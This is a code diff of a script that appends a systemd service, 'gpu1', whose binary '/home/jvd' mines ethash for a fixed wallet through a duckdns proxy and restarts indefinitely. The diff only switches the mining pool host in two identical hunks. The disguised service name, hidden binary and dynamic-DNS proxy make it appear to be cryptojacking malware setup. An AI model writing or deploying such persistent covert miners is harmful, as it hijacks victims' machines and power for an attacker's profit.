@@ -15,7 +15,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/jvd -a ethash -o stratum+tcp://asia2.ethermine.org:4444 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072.default  --proxy socketh.duckdns.org:9999
+ExecStart= /home/jvd -a ethash -o stratum+tcp://us1-etc.ethermine.org:4444 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072.default  --proxy socketh.duckdns.org:9999
 WatchdogSec=36000
 Restart=always
 RestartSec=60
@@ -50,7 +50,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/jvd -a ethash -o stratum+tcp://asia2.ethermine.org:4444 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072.default  --proxy socketh.duckdns.org:9999
+ExecStart= /home/jvd -a ethash -o stratum+tcp://us1-etc.ethermine.org:4444 -u 0xf27d2dd7303ea0d39e9762276467e98bb8d09072.default  --proxy socketh.duckdns.org:9999
 WatchdogSec=36000
 Restart=always
 RestartSec=60
